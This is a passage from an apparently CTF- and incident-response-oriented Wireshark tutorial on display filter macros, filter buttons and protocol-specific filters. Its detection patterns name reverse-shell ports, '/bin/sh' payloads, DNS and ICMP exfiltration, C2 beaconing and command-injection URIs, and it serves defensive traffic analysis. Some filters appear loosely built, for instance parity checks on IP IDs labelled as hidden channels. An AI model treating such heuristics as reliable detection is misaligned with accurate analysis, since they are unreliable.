2. **Via Configuration File:**
    

```bash
# Location: ~/.config/wireshark/dfilter_macros
# or: %APPDATA%\Wireshark\dfilter_macros (Windows)

# Format:
"MacroName" filter_expression

# Examples:
"WebTraffic" (http || https || tcp.port == 8080)
"InternalSrc" (ip.src == 192.168.0.0/16)
"AdminPorts" (tcp.port == 22 || tcp.port == 3389 || tcp.port == 5900)
```

### Practical Macro Library

**Network Segmentation Macros:**

```
Label: DMZ Traffic
Filter: (ip.src == 10.10.10.0/24 || ip.dst == 10.10.10.0/24)

Label: Management Network
Filter: (ip.src == 192.168.100.0/24 || ip.dst == 192.168.100.0/24)

Label: Guest WiFi
Filter: (ip.src == 172.16.50.0/24 || ip.dst == 172.16.50.0/24)

Label: Server Subnet
Filter: (ip.src == 10.0.1.0/24 || ip.dst == 10.0.1.0/24)
```

**Service-Based Macros:**

```
Label: Database Traffic
Filter: (tcp.port == 3306 || tcp.port == 5432 || tcp.port == 1433 || tcp.port == 1521 || tcp.port == 27017)

Label: Email Protocols
Filter: (tcp.port == 25 || tcp.port == 110 || tcp.port == 143 || tcp.port == 993 || tcp.port == 995)

Label: File Sharing
Filter: (tcp.port == 445 || tcp.port == 139 || tcp.port == 21 || tcp.port == 22 || tcp.port == 2049)

Label: Remote Access
Filter: (tcp.port == 22 || tcp.port == 23 || tcp.port == 3389 || tcp.port == 5900 || tcp.port == 5901)

Label: Web Services Filter: (http || https || tcp.port == 8080 || tcp.port == 8443 || tcp.port == 9090)

Label: DNS Services Filter: (dns || tcp.port == 53 || udp.port == 53 || tcp.port == 853)

Label: VPN Traffic Filter: (udp.port == 1194 || udp.port == 500 || udp.port == 4500 || udp.port == 51820 || tcp.port == 443 && ssl)
```

**Security-Focused Macros:**

```
Label: Malware Ports Filter: (tcp.port == 4444 || tcp.port == 5555 || tcp.port == 6666 || tcp.port == 31337 || tcp.port == 12345 || tcp.port == 1337)

Label: Reconnaissance Filter: (tcp.flags.syn == 1 && tcp.flags.ack == 0) || (icmp.type == 8) || (dns.qry.type == 255)

Label: Lateral Movement Filter: (tcp.port == 445 || tcp.port == 139 || tcp.port == 3389) && (ip.src == 192.168.0.0/16 && ip.dst == 192.168.0.0/16)

Label: Data Exfiltration Filter: ((http.request.method == "POST" && http.content_length > 100000) || (dns.qry.name.len > 50) || (icmp && data.len > 100))

Label: Brute Force Filter: (tcp.port == 22 || tcp.port == 3389 || tcp.port == 21 || tcp.port == 23) && (tcp.flags.syn == 1)

Label: Crypto Mining Filter: (tcp.port == 3333 || tcp.port == 4444 || tcp.port == 5555 || tcp.port == 7777 || tcp.port == 8888) || (dns.qry.name contains "pool")

Label: C2 Beaconing Filter: (tcp.len > 0 && tcp.len < 500) && (frame.time_delta > 0.5 && frame.time_delta < 2.0)
```

**Protocol Anomaly Macros:**

```
Label: Non-Standard HTTP Filter: (http) && (tcp.port != 80 && tcp.port != 443 && tcp.port != 8080 && tcp.port != 8443)

Label: Unusual DNS Filter: (dns) && ((dns.qry.name.len > 50) || (dns.resp.len > 512) || (dns.flags.response == 1 && dns.count.answers == 0))

Label: Fragmented Traffic Filter: (ip.frag_offset > 0) || (ip.flags.mf == 1)

Label: Encrypted Non-443 Filter: (ssl || tls) && (tcp.port != 443 && tcp.port != 8443 && tcp.port != 993 && tcp.port != 995)

Label: Zero-Day Indicators Filter: (tcp.urgent_pointer > 0) || (tcp.flags == 0x003) || (tcp.flags == 0x041)
```

**CTF-Specific Macros:**

```
Label: Flag Patterns Filter: (data.text contains "flag{" || data.text contains "CTF{" || data.text contains "FLAG{")

Label: Base64 Data Filter: (http.request.uri matches "[A-Za-z0-9+/=]{40,}") || (data.text matches "[A-Za-z0-9+/=]{40,}")

Label: Encoded Exfil Filter: (dns.qry.name matches "[a-f0-9]{32,}") || (icmp && data.data matches "[0-9A-Fa-f]{64,}")

Label: Hidden Channels Filter: (tcp.seq % 256 >= 32 && tcp.seq % 256 <= 126) || (icmp.ident >= 0x2000) || (ip.id % 2 == 0)

Label: Suspicious HTTP Filter: (http.request.uri contains "cmd=" || http.request.uri contains "exec=" || http.request.uri contains "shell=")

Label: File Transfers Filter: (http.request.method == "POST" && http.content_length > 1000) || (ftp.request.command == "STOR") || (smb2.cmd == 8)
```

### Filter Buttons Configuration

**Creating Filter Buttons:**

**Method 1: Right-Click Method**

1. Enter filter in display filter bar
2. Right-click the filter expression
3. Select "Save as Filter Button"
4. Enter button label
5. Click OK

**Method 2: Via Preferences**

```

Edit → Preferences → Filter Buttons Click "+" to add new button Enter:

- Label: Button text
- Filter: Display filter expression
- Comment: Optional description

````

**Method 3: Configuration File**

```bash
# Location: ~/.config/wireshark/preferences
# or: %APPDATA%\Wireshark\preferences (Windows)

# Format:
gui.filter_expressions.label: Label Text
gui.filter_expressions.enabled: TRUE
gui.filter_expressions.expr: filter_expression

# Example:
gui.filter_expressions.label: Web Traffic
gui.filter_expressions.enabled: TRUE
gui.filter_expressions.expr: http || https

gui.filter_expressions.label: Errors
gui.filter_expressions.enabled: TRUE
gui.filter_expressions.expr: tcp.analysis.retransmission || icmp.type == 3
````

### Organizing Filter Buttons

**Button Bar Layout:**

```
# Organize by category with separators (using empty buttons)

[General] [TCP/IP] [___] [Security] [___] [CTF]
 - All      - SYN       - Malware    - Flags
 - Errors   - Retrans   - Scanning   - B64
 - Large    - Reset     - Lateral    - Exfil
```

**Best Practices for Organization:**

1. **Group by function** (Protocol, Security, Analysis)
2. **Use clear, short labels** (max 15 characters)
3. **Order by frequency** (most used on left)
4. **Color-code mentally** (remember button positions)
5. **Document complex filters** in comments

### Advanced Filter Button Techniques

**Combinable Buttons:**

```
Button 1: HTTP
Filter: http

Button 2: POST
Filter: http.request.method == "POST"

Button 3: Large
Filter: tcp.len > 1000

# Click multiple buttons to combine:
# HTTP + POST + Large = http && http.request.method == "POST" && tcp.len > 1000
```

**Toggle Filters:**

```
Button: Show Errors Only
Filter: tcp.analysis.flags || icmp.type == 3 || http.response.code >= 400

Button: Hide Broadcast
Filter: !(eth.dst == ff:ff:ff:ff:ff:ff || ip.dst == 255.255.255.255)

Button: Isolate Conversation
# Use with right-click → Apply as Filter → Selected → A↔B
# Then save as button
```

**Time-Range Buttons:**

```
Button: First Minute
Filter: frame.time_relative < 60

Button: After 5 Min
Filter: frame.time_relative > 300

Button: Burst Activity
Filter: frame.time_delta < 0.01

Button: Slow Responses
Filter: http.time > 5.0
```

### Macro and Button Integration

**Using Macros in Buttons:**

```
# Define macro:
Macro Name: InternalNet
Expression: (ip.src == 192.168.0.0/16 || ip.dst == 192.168.0.0/16)

# Use in button:
Button Label: Internal HTTP
Filter: ${InternalNet} && http

Button Label: Internal Errors
Filter: ${InternalNet} && tcp.analysis.flags

Button Label: External Access
Filter: !${InternalNet}
```

**Parametrized Macros [Inference]:**

[Inference] Wireshark's macro system has limited parameter support. Alternative approaches include:

```
# Instead of parameters, create multiple specific macros:

Macro: WebPort80
Filter: (tcp.port == 80 || udp.port == 80)

Macro: WebPort8080
Filter: (tcp.port == 8080 || udp.port == 8080)

# Or use buttons for specific combinations:
Button: HTTP on 80
Filter: (tcp.port == 80) && http

Button: HTTP on 8080
Filter: (tcp.port == 8080) && http
```

### Exporting and Sharing Filter Configurations

**Export Filter Buttons:**

```bash
# Copy configuration files:
# Linux/Mac:
cp ~/.config/wireshark/preferences /path/to/backup/
cp ~/.config/wireshark/dfilter_macros /path/to/backup/

# Windows:
copy %APPDATA%\Wireshark\preferences C:\backup\
copy %APPDATA%\Wireshark\dfilter_macros C:\backup\

# Share with team:
# Extract relevant sections from preferences file
grep "gui.filter_expressions" ~/.config/wireshark/preferences > filter_buttons.txt
```

**Import Filter Buttons:**

```bash
# Merge into existing configuration:
cat filter_buttons.txt >> ~/.config/wireshark/preferences

# Or manually via GUI:
# Edit → Preferences → Filter Buttons → Import
```

**Profile-Based Organization:**

```bash
# Create profiles for different scenarios:
# Edit → Configuration Profiles → New

# Profile: CTF_Analysis
# - Flag hunting buttons
# - Encoding detection filters
# - Steganography macros

# Profile: Incident_Response
# - Malware indicators
# - IOC matching
# - Timeline reconstruction

# Profile: Network_Troubleshooting
# - Latency analysis
# - Retransmission tracking
# - MTU issues
```

### Dynamic Filter Button Workflows

**Sequential Analysis Workflow:**

```
Step 1: [Overview] - Show all traffic types
Button: Traffic Summary
Filter: 

Step 2: [Isolate Protocol] 
Button: HTTP Only
Filter: http

Step 3: [Find Anomalies]
Button: Errors
Filter: http.response.code >= 400

Step 4: [Specific Host]
# Right-click IP → Apply as Filter → Selected
# Then combine with existing filter

Step 5: [Time Context]
Button: 5sec Window
Filter: frame.time_relative > 120 && frame.time_relative < 125
```

**Investigation Template Buttons:**

```
[Phase 1: Reconnaissance]
Button: Port Scans
Filter: (tcp.flags.syn == 1 && tcp.flags.ack == 0) && (tcp.window_size <= 1024)

Button: Service Enum
Filter: tcp.port in {21,22,23,25,80,110,139,143,443,445,3389}

[Phase 2: Exploitation]
Button: Shell Traffic
Filter: (tcp.port == 4444 || tcp.port == 4445) || (data.text contains "/bin/sh")

Button: Payload Delivery
Filter: (http.request.method == "POST") || (smb2.cmd == 8) || (ftp.request.command == "STOR")

[Phase 3: Post-Exploit]
Button: Cred Access
Filter: (tcp.port == 445 || tcp.port == 135 || tcp.port == 389) && (ip.src == 192.168.0.0/16)

Button: Exfiltration
Filter: (tcp.flags.push == 1 && tcp.len > 1000) || (dns.qry.name.len > 50)
```

### Performance Optimization for Filters

**Efficient Filter Design:**

```
# Inefficient (evaluates complex regex on all packets):
http.request.uri matches "(?i)(union|select|insert)"

# Better (pre-filter by protocol):
http && (http.request.uri matches "(?i)(union|select|insert)")

# Best (most restrictive first):
(tcp.port == 80 || tcp.port == 8080) && http && (http.request.uri matches "(?i)(union|select|insert)")
```

**Button Optimization Strategies:**

```
# Fast general filter:
Button: Quick HTTP
Filter: tcp.port == 80 || tcp.port == 443

# Detailed analysis (slower):
Button: HTTP Details
Filter: http && (http.request.method || http.response.code) && (http.content_length > 0)

# Use fast button first, then refine with detailed
```

### Keyboard Shortcuts and Quick Access

**Filter Bar Shortcuts:**

```
Ctrl+E (Cmd+E on Mac) - Focus filter bar
Ctrl+/ - Clear filter
Ctrl+↓ - Filter history dropdown
Ctrl+Shift+S - Save current filter as button
Ctrl+Shift+B - Toggle filter button bar

# Custom keyboard shortcuts (via Edit → Preferences → Advanced → gui.*)
```

**Creating Hotkey-Accessible Buttons:**

```
# Use position-based access:
# Buttons 1-9 can be accessed via Alt+number (some systems)

Position 1: [All Traffic] - Alt+1
Position 2: [HTTP] - Alt+2
Position 3: [Errors] - Alt+3
```

### CTF-Specific Button Layouts

**Capture The Flag Button Bar:**

```
[Data Hunt] [Protocols] [Encoding] [Suspicious] [Tools]

Data Hunt:
- Flag Regex: (data.text contains "flag{" || data.text contains "CTF{")
- Base64: data.text matches "[A-Za-z0-9+/=]{40,}"
- Hex Dumps: data.data matches "[0-9A-Fa-f]{64,}"
- Strings: data.text && !(ssl.app_data)

Protocols:
- HTTP: http
- DNS: dns
- FTP: ftp || ftp-data
- SMB: smb || smb2
- ICMP: icmp

Encoding:
- URL Encoded: http.request.uri contains "%"
- B64 in URI: http.request.uri matches "[A-Za-z0-9+/=]{20,}"
- Hex in DNS: dns.qry.name matches "[a-f0-9]{32,}"
- ASCII Range: data.data matches "^[20-7e]+"

Suspicious:
- Shells: tcp.port == 4444 || tcp.port == 1234
- Pivots: (ip.src == 192.168.0.0/16) && (ip.dst == 192.168.0.0/16)
- Tunneling: (dns.qry.name.len > 50) || (icmp && data.len > 100)
- Weird Flags: tcp.flags == 0x000 || (tcp.flags.syn && tcp.flags.fin)

Tools:
- Follow TCP: # Use right-click menu
- Export Obj: # File → Export Objects
- Expert Info: # Analyze → Expert Information
- Conversations: # Statistics → Conversations
```

### Real-Time Filter Modification

**Interactive Filter Building:**

```
# Start broad:
Button: All Traffic
Filter: 

# Add constraint (click button + modify):
http

# Further refine:
http && (tcp.port == 8080)

# Add temporal:
http && (tcp.port == 8080) && (frame.time_relative > 100)

# Save refined filter as new button for reuse
```

**Context-Aware Filtering:**

```
# After identifying suspicious IP via Statistics:
# Create ad-hoc button:

Button: Suspicious IP
Filter: ip.addr == 203.0.113.50

# Combine with existing:
${Suspicious IP} && http

# Track across time:
${Suspicious IP} && (frame.time_relative > X)
```

### Macro Library for Common Scenarios

**Network Forensics Macros:**

```
Macro: TimelineStart
Filter: frame.time_relative < 10

Macro: TimelineMiddle
Filter: frame.time_relative > 100 && frame.time_relative < 200

Macro: TimelineEnd
Filter: frame.time_relative > 290

Macro: HighVolume
Filter: tcp.len > 1400 || udp.length > 1400

Macro: Retransmissions
Filter: tcp.analysis.retransmission || tcp.analysis.fast_retransmission

Macro: Handshakes
Filter: (tcp.flags == 0x002) || (tcp.flags == 0x012) || (tcp.flags == 0x010 && tcp.seq == 1)
```

**Malware Analysis Macros:**

```
Macro: C2Candidates
Filter: (tcp.len > 0 && tcp.len < 500) || (dns.qry.name.len > 30)

Macro: Downloaders
Filter: (http.request.method == "GET") && (http.request.uri contains ".exe" || http.request.uri contains ".dll")

Macro: Persistence
Filter: (tcp.port == 445 || tcp.port == 135) && (ip.src == 192.168.0.0/16)

Macro: Encryption
Filter: (ssl.handshake.type == 1) && (tcp.port != 443)

Macro: Scanning
Filter: (tcp.flags.syn == 1 && tcp.flags.ack == 0) && (tcp.analysis.initial_rtt)
```

### Troubleshooting Filter Issues

**Common Problems and Solutions:**

```
Problem: Filter not working
Solution: Check syntax with red/green indicator
- Red = syntax error
- Green = valid syntax
- Yellow = deprecated syntax (still works)

Problem: No results from known valid filter
Solution: Check field name spelling
- Use autocomplete (start typing and press Tab)
- Verify field exists: View → Internals → Supported Protocols

Problem: Macro not expanding
Solution: Verify macro definition
- Check dfilter_macros file syntax
- Restart Wireshark after editing file
- Use ${MacroName} syntax in filters

Problem: Button not appearing
Solution: Check filter button bar visibility
- View → Filter Toolbar
- Edit → Preferences → Filter Buttons → Verify enabled

Problem: Slow filter performance
Solution: Optimize filter order
- Put most restrictive conditions first
- Avoid complex regex on all packets
- Use protocol filters before content filters
```

**Validation and Testing:**

```bash
# Test filter syntax via tshark:
tshark -r capture.pcap -Y "your_filter_here" -c 1

# Benchmark filter performance:
time tshark -r large_capture.pcap -Y "complex_filter" > /dev/null

# Compare filter efficiency:
time tshark -r capture.pcap -Y "http matches 'pattern'" > /dev/null
time tshark -r capture.pcap -Y "http && http.request.uri matches 'pattern'" > /dev/null
```

---

## Integration and Workflow Examples

### Complete Analysis Workflow

**Incident Response Scenario:**

```
Step 1: Initial Triage
Button: [Overview] - No filter
- Review Protocol Hierarchy: Statistics → Protocol Hierarchy
- Check Endpoints: Statistics → Endpoints

Step 2: Identify Anomalies
Button: [Errors] - tcp.analysis.flags || http.response.code >= 400
Button: [Unusual Ports] - !(tcp.port in {80,443,22,25,53})

Step 3: Focus on Suspicious Activity
Button: [External Connections] - !(ip.src == 192.168.0.0/16 || ip.src == 10.0.0.0/8)
Button: [Large Transfers] - tcp.len > 10000

Step 4: Deep Dive
- Right-click suspicious IP → Follow → TCP Stream
- Extract objects: File → Export Objects → HTTP
- Timeline: Statistics → I/O Graph

Step 5: Evidence Collection
- Export specific packets: File → Export Specified Packets
- Save filters: Bookmark key findings as buttons
```

**CTF Challenge Workflow:**

```
Step 1: Initial Reconnaissance
Button: [All Protocols] - Protocol hierarchy
Macro: ${TimelineStart} - First 10 seconds

Step 2: Flag Hunting
Button: [Flag Search] - data.text contains "flag{" || data.text contains "CTF{"
Button: [Base64] - data.text matches "[A-Za-z0-9+/=]{40,}"

Step 3: Protocol Analysis
Button: [HTTP] - http
Button: [DNS] - dns
Button: [ICMP] - icmp
- Check each for hidden data

Step 4: Extraction
- Follow streams for concatenated data
- Export objects for file recovery
- Use regex for pattern extraction

Step 5: Decoding
- Base64 decode: echo "data" | base64 -d
- Hex decode: echo "data" | xxd -r -p
- Custom decoder scripts
```

---

## Important Related Topics

**Display Filter Reference:** Complete field reference, filter syntax documentation, protocol-specific filters

**Lua Scripting:** Custom dissectors, post-dissector modifications, automated filter generation

**Colorization Rules:** Packet coloring based on filters, visual analysis enhancement, custom color schemes

**Statistics and Graphs:** I/O graphs with filters, conversation filtering, endpoint isolation

**TShark Advanced Filtering:** Command-line equivalents, batch processing, automated analysis scripts

---

## Protocol-Specific Filters

Protocol-specific filters allow precise isolation of traffic patterns critical for CTF analysis. Mastering these filters enables rapid identification of attack vectors, data exfiltration, and hidden artifacts.

### TCP Advanced Filters

**TCP Flag Combinations:**

```bash
# SYN packet (connection initiation)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# SYN-ACK packet (server response)
tcp.flags.syn == 1 && tcp.flags.ack == 1

# ACK packet only
tcp.flags.ack == 1 && tcp.flags.syn == 0

# FIN packet (graceful close)
tcp.flags.fin == 1

# RST packet (abrupt close)
tcp.flags.reset == 1

# PSH flag (push data immediately)
tcp.flags.push == 1

# URG flag (urgent data)
tcp.flags.urg == 1

# FIN-ACK combination
tcp.flags.fin == 1 && tcp.flags.ack == 1

# RST-ACK combination
tcp.flags.reset == 1 && tcp.flags.ack == 1
```

**TCP Flag Bitmask Filtering:**

```bash
# Using hex bitmask (more efficient)
# TCP flags field structure (8 bits):
# CWR ECE URG ACK PSH RST SYN FIN
#  128  64  32  16   8   4   2   1

# SYN only (0x002)
tcp.flags == 0x002

# SYN-ACK (0x012)
tcp.flags == 0x012

# PSH-ACK (0x018)
tcp.flags == 0x018

# FIN-ACK (0x011)
tcp.flags == 0x011

# RST (0x004)
tcp.flags == 0x004

# Combined flag checks with bitwise AND
tcp.flags & 0x02  # Has SYN flag
tcp.flags & 0x10  # Has ACK flag
```

**TCP Window Size Analysis:**

```bash
# Zero window (receiver buffer full)
tcp.window_size == 0

# Small window (potential performance issue)
tcp.window_size < 1024

# Window scaling
tcp.options.wscale

# Window full
tcp.analysis.window_full
```

**TCP Analysis Flags:**

```bash
# Retransmissions
tcp.analysis.retransmission

# Fast retransmissions
tcp.analysis.fast_retransmission

# Duplicate ACKs
tcp.analysis.duplicate_ack

# Out-of-order packets
tcp.analysis.out_of_order

# Lost segments
tcp.analysis.lost_segment

# ACKed unseen segment
tcp.analysis.ack_lost_segment

# Zero window probes
tcp.analysis.zero_window_probe

# Keep-alive packets
tcp.analysis.keep_alive

# Reused ports (potential port scanning)
tcp.analysis.reused_ports
```

**TCP Stream Isolation:**

```bash
# Specific TCP stream
tcp.stream eq 0

# Multiple streams
tcp.stream eq 0 || tcp.stream eq 5 || tcp.stream eq 10

# Stream range
tcp.stream >= 0 && tcp.stream <= 10

# Exclude specific streams
!(tcp.stream eq 2 || tcp.stream eq 3)

# Streams with errors
tcp.analysis.flags && tcp.stream eq 0
```

**TCP Options Analysis:**

```bash
# MSS (Maximum Segment Size)
tcp.options.mss

# SACK (Selective Acknowledgment)
tcp.options.sack

# Timestamps
tcp.options.timestamp.tsval
tcp.options.timestamp.tsecr

# Window scale factor
tcp.options.wscale.shift

# Specific MSS value (OS fingerprinting)
tcp.options.mss_val == 1460  # Common for Linux
tcp.options.mss_val == 1380  # Common for Windows over VPN
```

**TCP Sequence/Acknowledgment Analysis:**

```bash
# Specific sequence number
tcp.seq == 1000

# Acknowledgment number
tcp.ack == 5000

# Next sequence number (seq + payload length)
tcp.nxtseq

# Relative sequence numbers (easier to read)
# Enable in: Edit → Preferences → Protocols → TCP → Relative sequence numbers
tcp.seq == 1  # First data byte after SYN

# Absolute sequence numbers
tcp.seq_raw
```

**TCP Payload Filtering:**

```bash
# TCP segments with data
tcp.len > 0

# Large TCP segments
tcp.len > 1400

# Small segments (potential C2 beaconing)
tcp.len < 100 && tcp.len > 0

# Specific payload size
tcp.len == 512

# TCP data payload search
tcp.payload contains "flag{"
tcp.payload contains 47:45:54:20  # "GET " in hex
```

### UDP Advanced Filters

**UDP Length Analysis:**

```bash
# Large UDP packets (potential DNS tunneling or data exfil)
udp.length > 512

# Small UDP packets
udp.length < 100

# Specific length
udp.length == 64

# UDP payload only (excluding header)
data.len > 1000 && udp
```

**UDP Port Patterns:**

```bash
# High ports (ephemeral range)
udp.port >= 49152 && udp.port <= 65535

# Low ports (well-known services)
udp.port < 1024

# Source port range
udp.srcport >= 1024 && udp.srcport < 5000

# Destination port not in common services
udp.dstport != 53 && udp.dstport != 123 && udp.dstport != 67 && udp.dstport != 68
```

**UDP Stream Analysis:**

```bash
# UDP streams (similar to TCP)
udp.stream eq 0

# Multiple UDP conversations
udp.stream eq 1 || udp.stream eq 2

# UDP checksum verification
udp.checksum.status == "Bad"
udp.checksum.status == "Good"
```

### HTTP/HTTPS Advanced Filters

**HTTP Request Method Filtering:**

```bash
# POST requests (potential data upload)
http.request.method == "POST"

# GET with parameters
http.request.method == "GET" && http.request.uri contains "?"

# PUT requests (file upload)
http.request.method == "PUT"

# DELETE requests
http.request.method == "DELETE"

# HEAD requests (reconnaissance)
http.request.method == "HEAD"

# OPTIONS requests (CORS/pre-flight)
http.request.method == "OPTIONS"

# Uncommon methods (potential exploitation)
http.request.method == "TRACE"
http.request.method == "CONNECT"
http.request.method == "PATCH"
```

**HTTP Response Code Filtering:**

```bash
# Success responses
http.response.code >= 200 && http.response.code < 300

# Redirection responses
http.response.code >= 300 && http.response.code < 400

# Client errors
http.response.code >= 400 && http.response.code < 500

# Server errors
http.response.code >= 500 && http.response.code < 600

# Specific interesting codes
http.response.code == 401  # Unauthorized (auth required)
http.response.code == 403  # Forbidden (access denied)
http.response.code == 404  # Not found (recon/scanning)
http.response.code == 500  # Internal error (potential exploitation)
http.response.code == 502  # Bad gateway
http.response.code == 503  # Service unavailable (DoS?)
```

**HTTP Header Filtering:**

```bash
# Authorization headers (credentials)
http.authorization

# Cookies
http.cookie contains "session"
http.cookie contains "admin"
http.cookie contains "token"

# Set-Cookie (session creation)
http.set_cookie

# Content-Type filtering
http.content_type == "application/json"
http.content_type == "application/x-www-form-urlencoded"
http.content_type == "multipart/form-data"
http.content_type contains "application/octet-stream"

# Content-Length filtering
http.content_length > 10000  # Large responses
http.content_length < 100    # Small responses

# Referer analysis
http.referer contains "google"
http.referer && !(http.referer contains http.host)  # External referer

# User-Agent filtering
http.user_agent contains "curl"
http.user_agent contains "python"
http.user_agent contains "bot"
http.user_agent contains "scanner"
http.user_agent matches "(?i)sqlmap|nikto|burp|metasploit"

# Custom headers
http.request.line contains "X-Forwarded-For"
http.request.line contains "X-Real-IP"
http.request.line contains "X-API-Key"
http.response.line contains "X-Powered-By"
http.response.line contains "Server"
```

**HTTP URI Analysis:**

```bash
# Query parameters
http.request.uri contains "?"

# Specific parameters
http.request.uri contains "id="
http.request.uri contains "user="
http.request.uri contains "cmd="
http.request.uri contains "file="

# Path patterns
http.request.uri matches "\\.(php|asp|aspx|jsp)$"
http.request.uri contains "/admin"
http.request.uri contains "/api"
http.request.uri contains "../"  # Path traversal

# Encoded content
http.request.uri contains "%20"  # URL encoded space
http.request.uri contains "%27"  # URL encoded '
http.request.uri contains "%3C"  # URL encoded 
http.request.uri matches "%[0-9a-fA-F]{2}"  # Any URL encoding

# Long URIs (potential attack payloads)
http.request.uri.len > 500

# Base64 patterns in URI
http.request.uri matches "[A-Za-z0-9+/]{40,}={0,2}"
```

**HTTP POST Data Analysis:**

```bash
# POST with data
http.request.method == "POST" && http.file_data

# POST data contains specific strings
http.file_data contains "password"
http.file_data contains "username"
http.file_data contains "email"
http.file_data contains "token"

# JSON POST data
http.request.method == "POST" && http.content_type contains "json"

# Form data
http.request.method == "POST" && http.content_type contains "form-urlencoded"

# File uploads
http.request.method == "POST" && http.content_type contains "multipart"

# Large POST data (data exfiltration)
http.request.method == "POST" && frame.len > 5000
```

**HTTP/2 Specific Filters:**

```bash
# HTTP/2 frames
http2

# HTTP/2 headers
http2.header

# Specific header names
http2.header.name == ":method"
http2.header.name == ":path"
http2.header.name == ":authority"
http2.header.name == "cookie"

# Header values
http2.header.value == "GET"
http2.header.name == ":path" && http2.header.value contains "admin"

# HTTP/2 data frames
http2.type == 0  # DATA frame

# HTTP/2 settings
http2.type == 4  # SETTINGS frame

# HTTP/2 streams
http2.streamid == 1
```

### DNS Advanced Filters

**DNS Query Type Filtering:**

```bash
# A records only
dns.qry.type == 1

# AAAA records (IPv6)
dns.qry.type == 28

# MX records
dns.qry.type == 15

# TXT records (often used for verification or tunneling)
dns.qry.type == 16

# NS records
dns.qry.type == 2

# CNAME records
dns.qry.type == 5

# PTR records (reverse lookup)
dns.qry.type == 12

# SOA records
dns.qry.type == 6

# SRV records
dns.qry.type == 33

# ANY queries (reconnaissance)
dns.qry.type == 255

# Multiple types in one filter
dns.qry.type in {1, 28, 15, 16}
```

**DNS Response Analysis:**

```bash
# Queries with responses
dns.flags.response == 0 && dns.count.answers > 0

# Queries without responses (dropped/filtered)
dns.flags.response == 0 && dns.count.answers == 0

# Multiple answers
dns.count.answers > 1

# Responses with authority records
dns.count.auth_rr > 0

# Additional records present
dns.count.add_rr > 0

# Response time analysis
dns.time > 1.0  # Slow responses (>1 second)
```

**DNS Response Code Analysis:**

```bash
# NXDOMAIN (domain doesn't exist)
dns.flags.rcode == 3

# SERVFAIL (server failure)
dns.flags.rcode == 2

# REFUSED (query refused)
dns.flags.rcode == 5

# NOERROR (successful)
dns.flags.rcode == 0

# FORMERR (format error)
dns.flags.rcode == 1

# Non-zero response codes (errors)
dns.flags.rcode != 0
```

**DNS Flags Filtering:**

```bash
# Recursive query desired
dns.flags.recdesired == 1

# Recursion available
dns.flags.recavail == 1

# Authoritative answer
dns.flags.authoritative == 1

# Truncated response (TCP fallback needed)
dns.flags.truncated == 1

# Authenticated data (DNSSEC)
dns.flags.authenticated == 1

# Checking disabled
dns.flags.checkdisable == 1
```

**DNS Query Name Patterns:**

```bash
# Long domain names (potential tunneling)
dns.qry.name.len > 50

# High entropy subdomains (base64/hex encoded data)
dns.qry.name matches "^[a-f0-9]{32,}\\."
dns.qry.name matches "^[A-Za-z0-9+/]{40,}\\."

# Multiple subdomains (suspicious depth)
dns.qry.name matches "^([^.]+\\.){5,}"

# Numeric subdomains
dns.qry.name matches "^[0-9]+\\."

# Specific TLDs
dns.qry.name contains ".com"
dns.qry.name matches "\\.tk$"  # Free TLD, often malicious
dns.qry.name matches "\\.xyz$"

# Private/local domains
dns.qry.name contains ".local"
dns.qry.name contains ".internal"
dns.qry.name contains ".lan"
```

**DNSSEC Filtering:**

```bash
# DNSSEC records
dns.qry.type == 43  # DS (Delegation Signer)
dns.qry.type == 46  # RRSIG (Resource Record Signature)
dns.qry.type == 47  # NSEC (Next Secure)
dns.qry.type == 48  # DNSKEY (DNS Public Key)
dns.qry.type == 50  # NSEC3

# DO (DNSSEC OK) bit
dns.flags.do == 1
```

### TLS/SSL Advanced Filters

**TLS Handshake Filtering:**

```bash
# All TLS handshake messages
tls.handshake

# Client Hello
tls.handshake.type == 1

# Server Hello
tls.handshake.type == 2

# Certificate
tls.handshake.type == 11

# Server Key Exchange
tls.handshake.type == 12

# Certificate Request
tls.handshake.type == 13

# Server Hello Done
tls.handshake.type == 14

# Certificate Verify
tls.handshake.type == 15

# Client Key Exchange
tls.handshake.type == 16

# Finished
tls.handshake.type == 20
```

**TLS Version Filtering:**

```bash
# SSL 3.0 (deprecated, vulnerable)
tls.record.version == 0x0300

# TLS 1.0 (deprecated)
tls.record.version == 0x0301

# TLS 1.1 (deprecated)
tls.record.version == 0x0302

# TLS 1.2 (current standard)
tls.record.version == 0x0303

# TLS 1.3 (latest)
tls.record.version == 0x0304

# Outdated SSL/TLS (security concern)
tls.record.version <= 0x0302
```

**TLS Cipher Suite Analysis:**

```bash
# Weak ciphers
tls.handshake.ciphersuite == 0x0005  # TLS_RSA_WITH_RC4_128_SHA (weak)
tls.handshake.ciphersuite == 0x000a  # TLS_RSA_WITH_3DES_EDE_CBC_SHA (weak)

# Strong modern ciphers
tls.handshake.ciphersuite == 0x1301  # TLS_AES_128_GCM_SHA256 (TLS 1.3)
tls.handshake.ciphersuite == 0x1302  # TLS_AES_256_GCM_SHA384 (TLS 1.3)

# NULL encryption (no encryption)
tls.handshake.ciphersuite == 0x0000

# Export-grade ciphers (vulnerable)
tls.handshake.ciphersuite & 0x0040
```

**Server Name Indication (SNI) Filtering:**

```bash
# Any SNI
tls.handshake.extensions_server_name

# Specific domain
tls.handshake.extensions_server_name == "example.com"

# Contains substring
tls.handshake.extensions_server_name contains "admin"
tls.handshake.extensions_server_name contains "api"

# Multiple domains (regex)
tls.handshake.extensions_server_name matches "(target1|target2|target3)\\.com"

# Extract all SNIs
tls.handshake.extensions_server_name && tcp.port == 443
```

**Certificate Analysis:**

```bash
# Certificate subject
x509sat.commonName

# Certificate issuer
x509sat.issuer

# Self-signed certificates (potential MITM)
tls.handshake.certificate && x509sat.commonName == x509sat.issuer

# Certificate validity period
x509ce.validity.notBefore
x509ce.validity.notAfter

# Subject Alternative Names
x509ce.dNSName

# Certificate serial number
x509sat.serialNumber
```

**TLS Alert Messages:**

```bash
# All TLS alerts
tls.alert_message

# Warning level
tls.alert_message.level == 1

# Fatal level
tls.alert_message.level == 2

# Specific alert types
tls.alert_message.desc == 0   # close_notify
tls.alert_message.desc == 20  # bad_record_mac
tls.alert_message.desc == 40  # handshake_failure
tls.alert_message.desc == 42  # bad_certificate
tls.alert_message.desc == 43  # unsupported_certificate
tls.alert_message.desc == 51  # decrypt_error
tls.alert_message.desc == 112 # unrecognized_name (SNI)
```

**TLS Session Resumption:**

```bash
# Session resumption via Session ID
tls.handshake.session_id

# Session resumption via tickets
tls.handshake.extension.type == 35  # session_ticket extension
```

### ICMP Advanced Filters

**ICMP Type and Code:**

```bash
# Echo Request (ping)
icmp.type == 8

# Echo Reply
